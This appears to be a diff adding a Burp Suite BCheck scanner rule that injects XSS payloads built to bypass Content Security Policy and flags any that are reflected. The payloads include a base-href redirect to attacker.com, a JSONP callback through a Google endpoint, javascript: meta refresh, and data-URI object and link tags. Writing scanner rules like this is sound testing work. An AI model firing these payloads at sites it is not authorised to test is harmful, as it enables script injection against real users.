@@ -1,0 +1,24 @@
+metadata:
+    language: v2-beta
+    name: "XSS - CSP Bypass Vectors"
+    description: "Tests XSS with payloads designed to bypass Content Security Policy restrictions"
+    author: "BCheck Arsenal"
+    tags: "xss", "csp-bypass", "waf-bypass"
+
+given insertion point then
+    send payload:
+        replacing: "{insertion_point}"
+        following replacements:
+            - "<base href='https://attacker.com/'>"
+            - "<script src='https://accounts.google.com/o/oauth2/revoke?callback=alert(1)'></script>"
+            - "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>"
+            - "<object data='data:text/html,<script>alert(1)</script>'>"
+            - "<link rel=import href='data:text/html,<script>alert(1)</script>'>"
+
+    if {check.response} matches "(<base href|<meta http-equiv|<object data|<link rel)" then
+        report issue:
+            severity: high
+            confidence: tentative
+            detail: "Potential CSP bypass vector detected. Injected tags that can circumvent Content-Security-Policy are reflected."
+            remediation: "Implement strict CSP with nonces or hashes. Avoid unsafe-inline and wildcards."
+    end if
